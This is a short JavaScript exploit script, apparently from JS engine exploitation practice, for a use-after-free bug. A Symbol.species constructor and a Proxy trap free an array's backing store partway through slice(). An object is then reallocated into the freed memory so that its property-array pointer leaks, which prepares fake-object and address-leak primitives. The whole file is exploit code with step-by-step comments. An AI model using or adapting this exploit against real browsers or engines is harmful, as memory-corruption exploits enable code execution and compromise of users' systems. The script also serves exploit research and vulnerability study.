// bug class: uaf
function hack(size, action, start, end) {
  // Allocate a backing array for given size
  let t = new Array(size/0x10|0);
  t.fill(1);

  t.constructor = {[Symbol.species]: function () {
      let evil = new Proxy({}, {
          defineProperty(x, key, desc) {
              if (key === '0')
                  // Free array ptr
                  t[1000] = 1;
              action(key, desc);
              return true;
          }
      });
      return evil;
  }};
  let o = t.slice(start, end);
}

// Used later for better fake_obj/addr_of later on
let real_jsvalue_array = [1];
let real_binary_buffer = new ArrayBuffer(16);

let confused_obj;
let prop_arr_leak;

// Our goal is to use the UAF to leak the address of a property array
// then we can use this to fake an object
hack(0x48, function(key, desc) {
  print("-------"+key);
  if (key === '0') {
      // Allocate object in UAF memory
      confused_obj = {
          a:1,
          b:2
      };
      //debug(confused_obj);
  } else if (key === '1') {
      // Now we read the property array pointer from confused object
      prop_arr_leak = desc.value;
      print("!!! Prop_arr = 0x"+ prop_arr_leak.toString(16));
      //cc();
  }
}, 1, 3);